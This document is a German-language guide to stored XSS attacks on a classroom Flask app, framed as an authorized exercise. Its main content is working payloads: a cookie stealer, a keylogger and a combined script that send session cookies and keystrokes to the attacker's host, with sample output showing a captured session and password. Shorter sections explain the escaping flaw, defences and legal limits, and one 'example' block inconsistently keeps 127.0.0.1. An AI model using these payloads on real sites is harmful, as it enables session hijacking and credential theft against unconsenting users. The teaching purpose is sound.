# XSS Payloads - Bildungszwecke (Autorisierter Test)

## Voraussetzungen
1. Flask App läuft auf deinem Rechner (z.B. `http://localhost:5001`)
2. Dein Nachbar greift auf deine App zu (z.B. über deine lokale IP im gleichen Netzwerk)
3. **WICHTIG:** Nur mit Erlaubnis des Nachbarn testen!

---

## 1. Cookie-Stealer XSS

### Schritt 1: Finde deine lokale IP-Adresse

**macOS/Linux:**
```bash
ifconfig | grep "inet " | grep -v 127.0.0.1
```

**Windows:**
```bash
ipconfig
```

Notiere deine IP (z.B. `192.168.1.100`)

### Schritt 2: Payload in Post einfügen

Logge dich ein und erstelle einen neuen Post mit folgendem Inhalt:

**WICHTIG:** Ersetze `DEINE_IP` mit deiner tatsächlichen IP!

```html
<script>
fetch('http://127.0.0.1:5001/steal_cookie?c=' + document.cookie);
</script>
```

**Beispiel (wenn deine IP 192.168.1.100 ist):**
```html
<script>
fetch('http://127.0.0.1:5001/steal_cookie?c=' + document.cookie);
</script>
```

### Schritt 3: Nachbar lässt sich testen

1. Dein Nachbar öffnet deinen Post (geht auf `/posts`)
2. Das Script läuft automatisch im Browser deines Nachbarn
3. Du siehst in deiner Konsole:

```
============================================================
🚨 COOKIE GESTOHLEN!
============================================================
Victim IP: 192.168.1.42
Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6InRlc3QifX0.ZxYzAw.abc123
============================================================
```

4. Der Cookie wird auch in `stolen_cookies.txt` gespeichert

---

## 2. Keylogger XSS

### Payload in Post einfügen

**WICHTIG:** Ersetze `DEINE_IP` mit deiner tatsächlichen IP!

```html
<script>
let buffer = '';
document.addEventListener('keypress', function(e) {
  buffer += e.key;
  if (buffer.length >= 10) {
    fetch('http://DEINE_IP:5001/log_keys', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'keys=' + encodeURIComponent(buffer)
    });
    buffer = '';
  }
});
</script>
```

**Beispiel (wenn deine IP 192.168.1.100 ist):**
```html
<script>
let buffer = '';
document.addEventListener('keypress', function(e) {
  buffer += e.key;
  if (buffer.length >= 10) {
    fetch('http://192.168.1.100:5001/log_keys', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'keys=' + encodeURIComponent(buffer)
    });
    buffer = '';
  }
});
</script>
```

### Test

1. Dein Nachbar öffnet den Post
2. Dein Nachbar tippt irgendwo auf der Seite (z.B. im Post-Formular)
3. Alle 10 Zeichen werden an deinen Server gesendet
4. Du siehst in deiner Konsole:

```
⌨️  KEYLOG [192.168.1.42]: Hallo Test
⌨️  KEYLOG [192.168.1.42]: Mein Passw
⌨️  KEYLOG [192.168.1.42]: ort123
```

5. Die Tastatureingaben werden auch in `keylog.txt` gespeichert

---

## Kombinierter Payload (Cookie + Keylogger)

```html
<script>
// Cookie stehlen
fetch('http://DEINE_IP:5001/steal_cookie?c=' + document.cookie);

// Keylogger starten
let buffer = '';
document.addEventListener('keypress', function(e) {
  buffer += e.key;
  if (buffer.length >= 10) {
    fetch('http://DEINE_IP:5001/log_keys', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'keys=' + encodeURIComponent(buffer)
    });
    buffer = '';
  }
});
</script>
```

---

## Hinweise

### Warum funktioniert das?

1. **XSS-Schwachstelle:** `{{ p.content|safe }}` in `posts.html:27` rendert HTML ohne Escaping
2. **Session-Cookies:** Flask speichert Session-Daten im Cookie (sichtbar mit `document.cookie`)
3. **Same-Origin-Policy Bypass:** Der Angreifer (du) hostet die Empfänger-Endpoints auf demselben Server

### Schutzmaßnahmen (für die Diskussion)

1. **Output Escaping:** `{{ p.content }}` statt `{{ p.content|safe }}`
2. **Content Security Policy (CSP):** Verhindert Inline-Scripts
3. **HttpOnly Cookies:** `document.cookie` kann nicht darauf zugreifen
4. **Input Validation:** HTML-Tags filtern
5. **XSS-Filter:** Moderne Browser haben eingebaute Filter

### Ethik & Rechtliches

- Nur in autorisiertem Kontext (Uni-Aufgabe, CTF, Pentest)
- Nur mit Erlaubnis des "Opfers"
- Niemals in Production-Systemen ohne Autorisierung
- In Deutschland: §202a-c StGB (Ausspähen von Daten)

---

## Troubleshooting

### "Fetch blocked by CORS"
- Stelle sicher, dass beide (du und Nachbar) auf dieselbe IP zugreifen
- Verwende `http://`, nicht `https://`

### "Cookie ist leer"
- Nachbar muss eingeloggt sein
- Prüfe ob Session-Cookie gesetzt ist (Browser DevTools → Application → Cookies)

### "Script wird nicht ausgeführt"
- Prüfe ob `|safe` Filter in `posts.html` gesetzt ist
- Öffne Browser Console (F12) und prüfe auf Fehler

### "Keylogger sendet nichts"
- Mindestens 10 Zeichen tippen
- Prüfe Network Tab in DevTools ob Requests gesendet werden
